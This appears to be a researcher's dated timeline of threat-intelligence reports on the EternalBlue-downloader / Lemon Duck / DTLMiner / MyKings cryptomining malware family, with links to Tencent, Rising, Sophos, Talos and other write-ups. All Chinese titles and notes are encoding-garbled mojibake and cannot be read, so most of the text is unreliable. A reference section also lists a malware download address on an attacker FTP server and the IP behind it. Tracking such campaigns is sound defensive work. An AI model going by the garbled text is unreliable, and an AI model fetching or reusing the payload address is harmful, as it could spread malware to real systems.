æ°¸æ’ä¹‹è“ä¸‹è½½å™¨æœ¨é©¬æŒç»­æ´»è·ƒï¼šå§‹äºä¾›åº”é“¾æ”»å‡»ï¼Œä¸æ–­å˜æ¢æ”»å‡»æ‰‹æ³•  è…¾è®¯

https://s.tencent.com/research/report/657.html

2019-03-01  

ç‘æ˜Ÿï¼šâ€œé©±åŠ¨äººç”Ÿæœ¨é©¬â€3è¿æ›´ å¢åŠ ç­¾åèº²æŸ¥æ€

>   è¿‘æ—¥ï¼Œç‘æ˜Ÿå®‰å…¨ç ”ç©¶é™¢ç›‘æµ‹åˆ°åˆ©ç”¨â€œé©±åŠ¨äººç”Ÿâ€ä¼ æ’­çš„æŒ–çŸ¿æœ¨é©¬ç—…æ¯’å†æ¬¡æ›´

http://it.rising.com.cn/dongtai/19521.html

2019-03-11

æ°¸æ’ä¹‹è“ä¸‹è½½å™¨æœ¨é©¬å‡çº§æ›´æ–°æ²¡å®Œæ²¡äº†æ–°å¢æ— æ–‡ä»¶æ”»å‡» è…¾è®¯

>   é€šè¿‡å¯¹æ¯”åˆ†æè¿˜å‘ç°â€œæ°¸æ’ä¹‹è“â€æœ¨é©¬ä¸‹è½½å™¨é»‘äº§å›¢ä¼™ä½¿ç”¨çš„Powershellæ”»å‡»ä»£ç ä¸è…¾è®¯å¾¡è§å¨èƒæƒ…æŠ¥ä¸­å¿ƒ2018å¹´9æœˆå‘ç°çš„Mykingsåƒµå°¸ç½‘ç»œå˜ç§æ”»å‡»ä»£ç æœ‰è¯¸å¤šç›¸ä¼¼ä¹‹å¤„ï¼Œå› æ­¤æ¨æµ‹ä¸¤è€…å…·æœ‰æŸç§è”ç³»ã€‚

https://s.tencent.com/research/report/674.html

2019-04-24

Beapy: Cryptojacking Worm Hits Enterprises in China

>   More than 80 percent of its victims located in China, with other victims in South Korea, Japan, and Vietnam.
>
>   èµ›é—¨é“å…‹å‘½åå…¶ä¸ºBeapy

https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/beapy-cryptojacking-worm-china

2019-06-05

Monero-Mining Malware PCASTLE Zeroes Back In on China, Now Uses Multilayered Fileless Arrival Techniques  

>   powershell ç»“æ„ ä¸sophosçš„æŠ¥å‘Šå…³è”
>
>   *Lemon-Duck*  æœ€æ—©åœ¨æŠ¥å‘Šä¸­å‡ºç°

https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/



2019-07-30

æ°¸æ’ä¹‹è“ä¸‹è½½å™¨æœ¨é©¬å†æ¬¡æ›´æ–°ï¼Œæ–°å¢ç§»åŠ¨ç›˜åŠç½‘ç»œå…±äº«ç›˜ä¼ æ’­  è…¾è®¯

https://s.tencent.com/research/report/768.html

2019-08-02  

ç‘æ˜Ÿï¼šä¸æ‰“è¡¥ä¸çš„è¯·è­¦æƒ•DTLæœ€æ–°å˜ç§

http://it.rising.com.cn/dongtai/19620.html

2019-08-16 

ç‘æ˜Ÿï¼šä¸€æœˆäºŒæ›´ â€œDTLMinerâ€ç—…æ¯’æœ‰ç‚¹ç‹‚

https://it.rising.com.cn/dongtai/19629.html

2019-09-03  

æŒ–çŸ¿æœ¨é©¬â€œDTLMinerâ€ ä¸­æ¯’åä»¿ä½›é—»åˆ°çƒ§æ˜¾å¡çš„å‘³é“ ç‘æ˜Ÿ

>    ç–‘ä¼¼æŒ–çŸ¿æœ¨é©¬ç—…æ¯’"DTLMiner"çš„æ–°å˜ç§ ï¼ˆ"43669/1/summary"ï¼‰  

http://it.rising.com.cn/dongtai/19635.html

2019-10-14

ç‘æ˜Ÿï¼šâ€œDTLMinerâ€å†æ¬¡æ›´æ–° æˆä¸ºé¦–ä¸ªåˆ©ç”¨BlueKeepæ¼æ´çš„ç—…æ¯’

http://it.rising.com.cn/dongtai/19652.html

2019-10-31  

DTLMinerå†æ›´æ–° æ’é™¤å¼‚å·±å¹¶æå‡æ”»å‡»æˆåŠŸç‡

http://it.rising.com.cn/dongtai/19659.html

2019-10-01

Lemon_Duck PowerShell malware cryptojacks enterprise networks    sophos

>   Based on the compromised machine count in the telemetry, we suspect that the attacks may have originated in Asia, but have spread to every continent.
>
>   æ”»å‡»è”“å»¶åˆ°å…¨çƒ
>
>   $Lemon_Duck

https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/

2020-02-05

New Lemon Duck Malware Campaign Targets IoT, Large Manufacturers

>   Lemon_Duck PowerShell
>
>   æ³¢åŠIoTè®¾å¤‡çŠ¶å†µ

https://vulners.com/threatpost/THREATPOST:FC124FCB1BDB55D5A63163F8F4720021

TrapX Security Identifies New Malware Campaign Targeting IoT Devices Embedded With Windows 7 at Manufacturing Sites

https://www.prnewswire.com/news-releases/trapx-security-identifies-new-malware-campaign-targeting-iot-devices-embedded-with-windows-7-at-manufacturing-sites-300999051.html

https://trapx.com/landing/iot-manufacturing-report/ 

2020-02-06

Lemon Duck Malware : Infecting outdated Windows systems using EternalBlue

https://www.secpod.com/blog/lemon-duck-malware/

2020-02-29

åœ¨é‡ç¤¾åŒºå‘ç°å­˜åœ¨IPCæ”»å‡»

https://www.v2ex.com/t/648332

2020-3-24

>    åœ¨ç¤¾åŒºå‘ç°å­˜åœ¨ä¹‹å‰ç‰ˆæœ¬æ¶æ„ä»£ç  

win10çš„powershellæ˜¯æœ¬æ¥å°±å¡é¡¿è¿˜æ˜¯å› ä¸ºæœ‰ç—…æ¯’

https://www.hostloc.com/thread-663326-1-1.html

2020-03-06 

è­¦æƒ•â€œé©±åŠ¨äººç”Ÿâ€æ— æ–‡ä»¶æŒ–çŸ¿å†æ¬¡æ›´æ–°  äºšä¿¡

https://www.freebuf.com/articles/terminal/228521.html 

2020-04-03 (åŒæ ·æœ¬)

â€œæ°¸æ’ä¹‹è“ä¸‹è½½å™¨æœ¨é©¬â€æ–°å¢é’“é±¼é‚®ä»¶ä¼ æ’­     è…¾è®¯å®‰å…¨å¨èƒæƒ…æŠ¥ä¸­å¿ƒ

https://s.tencent.com/research/report/950.html

2020-04-10 (åŒæ ·æœ¬)


æ°¸æ’ä¹‹è“æœ¨é©¬ä¸‹è½½å™¨å±•å¼€â€œè“èŒ¶â€è¡ŒåŠ¨ï¼Œå·²å˜èº«â€œé‚®ä»¶è •è™«â€   è…¾è®¯å®‰å…¨å¨èƒæƒ…æŠ¥ä¸­å¿ƒ

https://s.tencent.com/research/report/957.html

2020-04-15 

è •è™«ç—…æ¯’â€œæŸ æª¬é¸­â€æŒç»­æ‰©æ•£ å¤šç§æš´ç ´æ–¹å¼æ”»å‡»ç”¨æˆ·ç”µè„‘ ç«ç»’

https://mp.weixin.qq.com/s/HWdvSzN8Sl4ol0nnWs8m2w

2020-04-17

Weaponized RTF Document Generator & Mailer in PowerShell

https://isc.sans.edu/diary/Weaponized+RTF+Document+Generator+%26+Mailer+in+PowerShell/26030

2020-04-21

æ¥è‡ªâ€œè“èŒ¶â€çš„é—®å€™ï¼šâ€œä½ æ˜¯ä¸æ˜¯ç–¯â€ï¼Œæš—è—æ–°æ”»å‡»æ‰‹æ³•  è…¾è®¯

https://s.tencent.com/research/report/967.html

2020-06-03

æ°¸æ’ä¹‹è“æœ¨é©¬ä¸‹è½½å™¨å‘èµ· â€œé»‘çƒâ€è¡ŒåŠ¨ï¼Œæ–°å¢SMBGhostæ¼æ´æ£€æµ‹èƒ½åŠ› è…¾è®¯

https://mp.weixin.qq.com/s/QEE95HTKzuT4-NykfvHfGQ

2020-10-13 

æŸ æª¬é¸­ä½¿åŠ å¯†è´§å¸çŸ¿å·¥é‡æ–°æˆä¸ºå…³æ³¨ç„¦ç‚¹  talos

https://blog.talosintelligence.com/2020/10/lemon-duck-brings-cryptocurrency-miners.html 

### å…³è”å‚è€ƒä¿¡æ¯

2017-07-15

```
ftp://81.177.135.35/./a.exe
```

https://packettotal.com/app/analysis?id=cd988ed555a1b8857f6b1587971769f5&name=ftp

2018-01-24

MyKings: ä¸€ä¸ªå¤§è§„æ¨¡å¤šé‡åƒµå°¸ç½‘ç»œ

https://blog.netlab.360.com/mykings-the-botnet-behind-multiple-active-spreading-botnets/

2018-02-02

>    81.177.135.35 -> mys2016.info 

Smominru Monero mining botnet making millions for operators

https://otx.alienvault.com/pulse/5a744ab2542d5e34b443da23/

2018-09-10

Mykingsåƒµå°¸ç½‘ç»œå˜ç§æ”»å‡»  è…¾è®¯

https://www.freebuf.com/column/183705.html  

2019-02-10

æš—äº‘III v3.0 ã€Mykingsã€Miraiå¤šä¸ªç—…æ¯’å®¶æ—ç»“ä¼´æ¥è¢­çš„å®æˆ˜åˆ†æ 

>   81.177.135.35

https://www.freebuf.com/vuls/194515.html

2019-02-14

åŒä¸€å›¢ä¼™è¿˜æ˜¯æ ½èµƒå«ç¥¸ï¼Ÿä¸¨â€œé©±åŠ¨äººç”Ÿâ€åŠ«æŒäº‹ä»¶ä¸Mykingså®¶æ—æ´»åŠ¨çš„å…³è”åˆ†æ

>   èµï¼Œè¿™ä¸ªæŠ¥å‘Šå¸®æˆ‘ä»¬å‡å°‘äº†éƒ¨åˆ†å…³è”åˆ†æçš„å·¥ä½œ

https://www.freebuf.com/articles/system/195337.html



æ–°å¢Pythonæ”»å‡»æ¨¡å—:

![image-20200703183341027](%E9%98%BF%E9%BB%84%E9%9D%92%E6%98%A5%E7%89%88.assets/image-20200703183341027.png)
